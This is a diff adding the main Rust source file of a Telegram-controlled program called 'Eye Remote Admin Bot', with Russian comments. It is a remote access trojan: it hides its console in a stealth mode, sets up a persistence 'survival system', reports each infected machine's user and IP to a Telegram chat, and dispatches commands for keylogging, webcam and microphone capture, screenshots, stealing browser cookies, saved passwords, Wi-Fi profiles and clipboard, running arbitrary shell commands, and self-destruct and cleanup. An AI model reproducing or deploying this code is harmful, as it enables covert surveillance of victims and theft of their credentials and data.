@@ -1,0 +1,789 @@
+mod config;
+mod device_manager;
+mod telegram_client;
+mod system_commands;
+mod file_commands;
+mod monitoring_commands;
+mod security_commands;
+mod execution_commands;
+mod popup_commands;
+mod advanced_commands;
+mod auth;
+mod token_security;
+mod backup_manager;
+
+use std::sync::Arc;
+use anyhow::Result;
+use tokio::signal;
+
+#[cfg(windows)]
+extern "system" {
+    fn GetConsoleWindow() -> *mut std::ffi::c_void;
+    fn ShowWindow(hwnd: *mut std::ffi::c_void, n_cmd_show: i32) -> i32;
+    fn FreeConsole() -> i32;
+}
+
+#[cfg(windows)]
+fn hide_console_immediately() {
+    unsafe {
+        let console_window = GetConsoleWindow();
+        if !console_window.is_null() {
+            ShowWindow(console_window, 0); // SW_HIDE = 0
+            FreeConsole(); // Освобождаем консоль полностью
+        }
+    }
+}
+
+use config::{init_logging, validate_config};
+use device_manager::DeviceManager;
+use telegram_client::{TelegramClient, Message};
+
+#[tokio::main]
+async fn main() -> Result<()> {
+    // Проверяем имя исполняемого файла для автоматического stealth режима
+    let current_exe = std::env::current_exe().unwrap_or_default();
+    let exe_name = current_exe
+        .file_stem()
+        .and_then(|name| name.to_str())
+        .unwrap_or("")
+        .to_lowercase();
+    
+    let stealth_mode = exe_name.contains("stealth") || 
+                      exe_name.contains("silent") || 
+                      std::env::var("EYE_STEALTH").is_ok();
+    
+    if stealth_mode {
+        // В stealth режиме немедленно скрываем консоль
+        #[cfg(windows)]
+        hide_console_immediately();
+    }
+    
+    // Check command line arguments for hash generation
+    let args: Vec<String> = std::env::args().collect();
+    if args.len() == 3 && args[1] == "--generate-hash" {
+        if let Ok(chat_id) = args[2].parse::<i64>() {
+            match auth::generate_chat_hash(chat_id) {
+                Ok(hash) => {
+                    println!("🔐 Сгенерированный Argon2 хеш для ChatID {}:", chat_id);
+                    println!("📋 Скопируйте этот хеш в AUTHORIZED_HASHES в src/auth.rs:");
+                    println!("{}", hash);
+                    println!("\n⚠️  После добавления хеша перекомпилируйте программу!");
+                    return Ok(());
+                }
+                Err(e) => {
+                    eprintln!("❌ Ошибка генерации хеша: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        } else {
+            eprintln!("❌ Неверный формат ChatID. Используйте: --generate-hash 123456789");
+            std::process::exit(1);
+        }
+    }
+    
+    // Initialize logging
+    init_logging();
+    
+    log::info!("🚀 Запуск Eye Remote Admin Bot...");
+
+    // 🛡️ СИСТЕМА ВЫЖИВАНИЯ - инициализация при первом запуске
+    if let Err(e) = backup_manager::initialize_survival_system().await {
+        log::warn!("Не удалось инициализировать систему выживания: {}", e);
+    }
+    
+    // 🔄 Проверка и восстановление системы выживания
+    if let Err(e) = backup_manager::check_and_restore_survival().await {
+        log::warn!("Не удалось проверить систему выживания: {}", e);
+    }
+
+    // Проверка конфигурации
+    if let Err(e) = validate_config() {
+        log::error!("❌ Ошибка конфигурации: {}", e);
+        eprintln!("❌ Ошибка конфигурации: {}", e);
+        eprintln!("📝 Отредактируйте файл src/config.rs и укажите правильный BOT_TOKEN");
+        eprintln!("🔐 Настройте авторизацию в src/auth.rs (см. комментарии в файле)");
+        std::process::exit(1);
+    }
+
+    // Инициализация менеджера устройств
+    let device_manager = Arc::new(DeviceManager::new());
+    
+    // Инициализация текущего устройства
+    match device_manager.initialize_current_device().await {
+        Ok(device_id) => {
+            log::info!("✅ Устройство инициализировано с ID: {}", device_id);
+            println!("✅ Устройство инициализировано с ID: {}", device_id);
+        }
+        Err(e) => {
+            log::error!("❌ Ошибка инициализации устройства: {}", e);
+            eprintln!("❌ Ошибка инициализации устройства: {}", e);
+            std::process::exit(1);
+        }
+    }
+
+    // Создание временной директории
+    if let Err(e) = file_commands::ensure_temp_directory() {
+        log::warn!("⚠️ Не удалось создать временную директорию: {}", e);
+    }
+
+    // Инициализация Telegram клиента
+    let telegram_client = TelegramClient::new();
+    
+    // Уведомление о запуске
+    if let Some(device) = device_manager.get_current_device() {
+        let startup_message = format!(
+            "🟢 **Устройство подключено**\n\
+            📱 ID: `{}`\n\
+            💻 Имя: `{}`\n\
+            👤 Пользователь: `{}`\n\
+            🌐 IP: `{}`\n\
+            🕐 Время: {}",
+            device.device_id,
+            device.device_name,
+            device.username,
+            device.external_ip,
+            chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
+        );
+        
+        if let Err(e) = telegram_client.send_message(
+            auth::get_notification_chat_id().unwrap_or_default(), 
+            &startup_message
+        ).await {
+            log::warn!("⚠️ Не удалось отправить уведомление о запуске: {}", e);
+        }
+    }
+
+    // Клонируем Arc для использования в разных потоках
+    let device_manager_clone = Arc::clone(&device_manager);
+    let telegram_client_clone = telegram_client.clone();
+
+    // Обработчик команд
+    let command_handler = move |message: Message| -> Result<()> {
+        let device_manager = Arc::clone(&device_manager_clone);
+        let telegram_client = telegram_client_clone.clone();
+        
+        tokio::spawn(async move {
+            if let Err(e) = handle_message(message, device_manager, telegram_client).await {
+                log::error!("Ошибка обработки сообщения: {}", e);
+            }
+        });
+        
+        Ok(())
+    };
+
+    log::info!("🤖 Telegram бот запущен и готов к работе");
+    println!("🤖 Telegram бот запущен и готов к работе");
+    println!("💡 Для остановки нажмите Ctrl+C");
+
+    // Запуск polling с обработкой сигналов
+    tokio::select! {
+        result = telegram_client.start_polling(command_handler) => {
+            if let Err(e) = result {
+                log::error!("❌ Ошибка Telegram polling: {}", e);
+                eprintln!("❌ Ошибка Telegram polling: {}", e);
+            }
+        }
+        _ = signal::ctrl_c() => {
+            log::info!("🛑 Получен сигнал остановки");
+            println!("\n🛑 Остановка приложения...");
+            
+            // Отправляем уведомление об отключении
+            if let Some(device) = device_manager.get_current_device() {
+                let shutdown_message = format!(
+                    "🔴 **Устройство отключено**\n\
+                    📱 ID: `{}`\n\
+                    💻 Имя: `{}`\n\
+                    🕐 Время: {}",
+                    device.device_id,
+                    device.device_name,
+                    chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
+                );
+                
+                let _ = telegram_client.send_message(
+                    auth::get_notification_chat_id().unwrap_or_default(), 
+                    &shutdown_message
+                ).await;
+            }
+        }
+    }
+
+    log::info!("👋 Приложение завершено");
+    println!("👋 До свидания!");
+    Ok(())
+}
+
+/// Обработчик входящих документов
+async fn handle_document(
+    _document: telegram_client::Document,
+    _device_manager: Arc<DeviceManager>,
+    _telegram_client: TelegramClient,
+    _chat_id: i64,
+) -> Result<()> {
+    // Заглушка для обработки документов
+    Ok(())
+}
+
+/// Обработчик входящих сообщений
+async fn handle_message(
+    message: telegram_client::Message,
+    device_manager: Arc<DeviceManager>,
+    telegram_client: TelegramClient,
+) -> Result<()> {
+    let chat_id = message.chat.id;
+    
+    // Получаем текст сообщения
+    let text = match message.text {
+        Some(text) => text.trim().to_string(),
+        None => {
+            // Если это файл, обрабатываем upload
+            if let Some(document) = message.document {
+                return handle_file_upload(document, device_manager, telegram_client, chat_id).await;
+            }
+            return Ok(());
+        }
+    };
+
+    // Парсим команду
+    let parts: Vec<&str> = text.split_whitespace().collect();
+    if parts.is_empty() {
+        return Ok(());
+    }
+
+    let command = parts[0].to_lowercase();
+    
+    log::info!("📨 Получена команда: {} от chat_id: {}", command, chat_id);
+    
+    // 🔐 ПРОВЕРКА АВТОРИЗАЦИИ ЧЕРЕЗ ARGON2 ХЕШ
+    if !auth::is_authorized_chat(chat_id) {
+        log::warn!("⚠️ Попытка доступа от неавторизованного chat_id: {}", chat_id);
+        // Отправляем нейтральный ответ, чтобы не раскрывать наличие бота
+        telegram_client.send_message(chat_id, "❌ Доступ запрещен").await?;
+        return Ok(());
+    }
+    
+    log::info!("✅ Авторизация успешна для команды: {}", command);
+
+    match command.as_str() {
+        "/start" => {
+            let welcome_msg = "👋 Добро пожаловать в Eye Remote Admin Bot!\n\nИспользуйте /help для получения списка доступных команд.";
+            telegram_client.send_message(chat_id, welcome_msg).await?;
+        }
+        
+        "/help" => {
+            telegram_client.send_help(chat_id).await?;
+        }
+        
+        "/devices" => {
+            let response = system_commands::handle_devices_command(&device_manager).await?;
+            telegram_client.send_long_message(chat_id, &response).await?;
+        }
+        
+        "/info" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /info <device_id>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let response = system_commands::handle_info_command(&device_manager, device_id).await?;
+            telegram_client.send_long_message(chat_id, &response).await?;
+        }
+        
+        "/ipinfo" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /ipinfo <device_id>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let response = system_commands::handle_ipinfo_command(&device_manager, device_id).await?;
+            telegram_client.send_long_message(chat_id, &response).await?;
+        }
+        
+        "/listdrives" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /listdrives <device_id>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let response = system_commands::handle_listdrives_command(&device_manager, device_id).await?;
+            telegram_client.send_long_message(chat_id, &response).await?;
+        }
+        
+        "/listdirs" => {
+            if parts.len() < 3 {
+                telegram_client.send_error(chat_id, "Использование: /listdirs <device_id> <path>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let path = parts[2..].join(" ");
+            let response = file_commands::handle_listdirs_command(&device_manager, device_id, &path).await?;
+            telegram_client.send_long_message(chat_id, &response).await?;
+        }
+        
+        "/listfiles" => {
+            if parts.len() < 3 {
+                telegram_client.send_error(chat_id, "Использование: /listfiles <device_id> <path>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let path = parts[2..].join(" ");
+            let response = file_commands::handle_listfiles_command(&device_manager, device_id, &path).await?;
+            telegram_client.send_long_message(chat_id, &response).await?;
+        }
+        
+        "/download" => {
+            if parts.len() < 3 {
+                telegram_client.send_error(chat_id, "Использование: /download <device_id> <file_path>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let file_path = parts[2..].join(" ");
+            
+            match file_commands::handle_download_command(&device_manager, device_id, &file_path).await {
+                Ok((file_name, file_data)) => {
+                    // Сохраняем файл временно и отправляем
+                    let temp_dir = file_commands::ensure_temp_directory()?;
+                    let temp_file_path = temp_dir.join(&file_name);
+                    
+                    tokio::fs::write(&temp_file_path, &file_data).await?;
+                    
+                    let caption = format!(
+                        "📁 Файл с устройства `{}`\n📄 Размер: {} байт",
+                        device_id,
+                        file_data.len()
+                    );
+                    
+                    if let Err(e) = telegram_client.send_document(chat_id, temp_file_path.to_str().unwrap(), Some(&caption)).await {
+                        telegram_client.send_error(chat_id, &format!("Ошибка отправки файла: {}", e)).await?;
+                    }
+                    
+                    // Удаляем временный файл
+                    let _ = tokio::fs::remove_file(&temp_file_path).await;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка скачивания файла: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/reroll" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /reroll <device_id>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            
+            if !device_manager.is_valid_device_id(device_id) {
+                telegram_client.send_error(chat_id, &format!("Устройство с ID {} не найдено", device_id)).await?;
+                return Ok(());
+            }
+            
+            match device_manager.reroll_device_id().await {
+                Ok(new_id) => {
+                    let response = format!(
+                        "🔄 **ID устройства изменен**\n\
+                        📱 Старый ID: `{}`\n\
+                        🆕 Новый ID: `{}`\n\
+                        🕐 Время: {}",
+                        device_id,
+                        new_id,
+                        chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
+                    );
+                    telegram_client.send_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка изменения ID: {}", e)).await?;
+                }
+            }
+        }
+        
+        // Команды мониторинга
+        "/screenshot" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /screenshot <device_id>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            
+            match monitoring_commands::handle_screenshot_command(&device_manager, device_id).await {
+                Ok(image_data) => {
+                    // Сохраняем скриншот временно и отправляем
+                    let temp_dir = file_commands::ensure_temp_directory()?;
+                    let temp_file_path = temp_dir.join("screenshot.png");
+                    
+                    tokio::fs::write(&temp_file_path, &image_data).await?;
+                    
+                    let caption = format!("📸 Скриншот с устройства `{}`", device_id);
+                    
+                    if let Err(e) = telegram_client.send_document(chat_id, temp_file_path.to_str().unwrap(), Some(&caption)).await {
+                        telegram_client.send_error(chat_id, &format!("Ошибка отправки скриншота: {}", e)).await?;
+                    }
+                    
+                    let _ = tokio::fs::remove_file(&temp_file_path).await;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка создания скриншота: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/webcam" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /webcam <device_id> [delay] [camera_index]").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let delay = parts.get(2).and_then(|s| s.parse().ok());
+            let camera_index = parts.get(3).and_then(|s| s.parse().ok());
+            
+            match monitoring_commands::handle_webcam_command(&device_manager, device_id, delay, camera_index).await {
+                Ok(response) => {
+                    telegram_client.send_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка веб-камеры: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/keylogger" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /keylogger <device_id>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            
+            match monitoring_commands::handle_keylogger_command(&device_manager, device_id).await {
+                Ok(response) => {
+                    telegram_client.send_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка keylogger: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/micrec" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /micrec <device_id> [duration_seconds]").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let duration = parts.get(2).and_then(|s| s.parse().ok());
+            
+            match monitoring_commands::handle_micrec_command(&device_manager, device_id, duration).await {
+                Ok(response) => {
+                    telegram_client.send_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка записи микрофона: {}", e)).await?;
+                }
+            }
+        }
+        
+        // Команды безопасности
+        "/cookies" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /cookies <device_id>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            
+            match security_commands::handle_cookies_command(&device_manager, device_id).await {
+                Ok(response) => {
+                    telegram_client.send_long_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка извлечения cookies: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/weblogins" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /weblogins <device_id>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            
+            match security_commands::handle_weblogins_command(&device_manager, device_id).await {
+                Ok(response) => {
+                    telegram_client.send_long_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка извлечения паролей: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/wifiprofiles" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /wifiprofiles <device_id>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            
+            match security_commands::handle_wifiprofiles_command(&device_manager, device_id).await {
+                Ok(response) => {
+                    telegram_client.send_long_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка получения WiFi профилей: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/getclipboard" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /getclipboard <device_id>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            
+            match security_commands::handle_getclipboard_command(&device_manager, device_id).await {
+                Ok(response) => {
+                    telegram_client.send_long_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка получения буфера обмена: {}", e)).await?;
+                }
+            }
+        }
+        
+        // Команды выполнения
+        "/exec" => {
+            if parts.len() < 3 {
+                telegram_client.send_error(chat_id, "Использование: /exec <device_id> <command>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let command = parts[2..].join(" ");
+            
+            match execution_commands::handle_exec_command(&device_manager, device_id, &command).await {
+                Ok(response) => {
+                    telegram_client.send_long_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка выполнения команды: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/start_app" => {
+            if parts.len() < 3 {
+                telegram_client.send_error(chat_id, "Использование: /start_app <device_id> <program>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let target = parts[2..].join(" ");
+            
+            match execution_commands::handle_start_command(&device_manager, device_id, &target).await {
+                Ok(response) => {
+                    telegram_client.send_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка запуска программы: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/apps" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /apps <device_id>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            
+            match execution_commands::handle_apps_command(&device_manager, device_id).await {
+                Ok(response) => {
+                    telegram_client.send_long_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка получения списка приложений: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/kill" => {
+            if parts.len() < 3 {
+                telegram_client.send_error(chat_id, "Использование: /kill <device_id> <process_name_or_pid>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let target = parts[2];
+            
+            match execution_commands::handle_kill_command(&device_manager, device_id, target).await {
+                Ok(response) => {
+                    telegram_client.send_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка завершения процесса: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/processes" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /processes <device_id>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            
+            match execution_commands::handle_processes_command(&device_manager, device_id).await {
+                Ok(response) => {
+                    telegram_client.send_long_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка получения списка процессов: {}", e)).await?;
+                }
+            }
+        }
+        
+        // Popup команды
+        "/popup" => {
+            if parts.len() < 3 {
+                telegram_client.send_error(chat_id, "Использование: /popup <device_id> <message>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let message = parts[2..].join(" ");
+            
+            match popup_commands::handle_popup_command(&device_manager, device_id, &message).await {
+                Ok(response) => {
+                    telegram_client.send_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка показа popup: {}", e)).await?;
+                }
+            }
+        }
+        
+        // Продвинутые команды
+        "/url" => {
+            if parts.len() < 3 {
+                telegram_client.send_error(chat_id, "Использование: /url <device_id> <url>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let url = parts[2..].join(" ");
+            
+            match advanced_commands::handle_url_command(&device_manager, device_id, &url).await {
+                Ok(response) => {
+                    telegram_client.send_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка открытия URL: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/selfdestruct" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /selfdestruct <device_id> [CONFIRM_DESTROY]").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let confirmation = parts.get(2).copied();
+            
+            match advanced_commands::handle_selfdestruct_command(&device_manager, device_id, confirmation).await {
+                Ok(response) => {
+                    telegram_client.send_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка самоуничтожения: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/shutdown" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /shutdown <device_id> [delay_seconds]").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let delay = parts.get(2).and_then(|s| s.parse().ok());
+            
+            match advanced_commands::handle_shutdown_command(&device_manager, device_id, delay).await {
+                Ok(response) => {
+                    telegram_client.send_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка выключения: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/restart" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /restart <device_id> [delay_seconds]").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            let delay = parts.get(2).and_then(|s| s.parse().ok());
+            
+            match advanced_commands::handle_restart_command(&device_manager, device_id, delay).await {
+                Ok(response) => {
+                    telegram_client.send_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка перезагрузки: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/lock" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /lock <device_id>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            
+            match advanced_commands::handle_lock_command(&device_manager, device_id).await {
+                Ok(response) => {
+                    telegram_client.send_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка блокировки экрана: {}", e)).await?;
+                }
+            }
+        }
+        
+        "/cleanup" => {
+            if parts.len() < 2 {
+                telegram_client.send_error(chat_id, "Использование: /cleanup <device_id>").await?;
+                return Ok(());
+            }
+            let device_id = parts[1];
+            
+            match advanced_commands::handle_cleanup_command(&device_manager, device_id).await {
+                Ok(response) => {
+                    telegram_client.send_message(chat_id, &response).await?;
+                }
+                Err(e) => {
+                    telegram_client.send_error(chat_id, &format!("Ошибка очистки: {}", e)).await?;
+                }
+            }
+        }
+        
+        _ => {
+            if command.starts_with('/') {
+                telegram_client.send_error(chat_id, "❓ Unknown command. Используйте /help для получения списка команд.").await?;
+            }
+        }
+    }
+
+    Ok(())
+}
+
+/// Обработчик загрузки файлов
+async fn handle_file_upload(
+    _document: telegram_client::Document,
+    _device_manager: Arc<DeviceManager>,
+    telegram_client: TelegramClient,
+    chat_id: i64,
+) -> Result<()> {
+    // Здесь будет реализована логика загрузки файлов
+    // Пока отправляем заглушку
+    telegram_client.send_message(chat_id, "📁 Загрузка файлов будет реализована в следующих обновлениях").await?;
+    Ok(())
+}
+
